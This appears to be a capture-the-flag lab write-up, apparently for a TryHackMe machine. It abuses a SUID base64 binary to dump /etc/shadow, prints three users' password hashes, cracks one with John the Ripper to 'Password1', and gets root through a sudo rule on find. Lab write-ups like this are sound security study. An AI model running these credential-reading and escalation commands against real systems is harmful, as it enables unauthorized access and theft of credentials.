1. kernel version = 3.10.0-1160.el7.x86_64

2. searching for SUID bits 
   found /usr/bin/base64 

   so trying to find hash using base64 decoder
   
   1 -> making a variable and assiging a shadow folder path in it 
        LFILE=/etc/shadow
   
   2 -> base64 "$LFILE" | base64 --decode 
        the above command will decode it and find the hash for the user
 
        dir in /home are (leonard,missy,rootflag)

        found sha512crypt for root , leonard , messy 
   
        leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::

        missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::

        root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::

    3 -> using john to crack the password of missy
         SYNTAX : john hash1.txt -format=sha512crypt -wordlist=~/Tryhackme/List_For_Enumeration/wordlists/rockyou.txt
         Found Password : Password1


3. Now we have a found the password of missy we will login in it and try to find the flag1.txt and try to escalate the priviliges 
   
   trying to SUID bit files and it we the same as leonard nothing new
   
   using sudo -l command I found that find command can we run using sudo with NOPASSWD so 

   SYNTAX : sudo find . -exec /bin/sh \; -quit 

   WE  GOT  ROOT  ACCESS
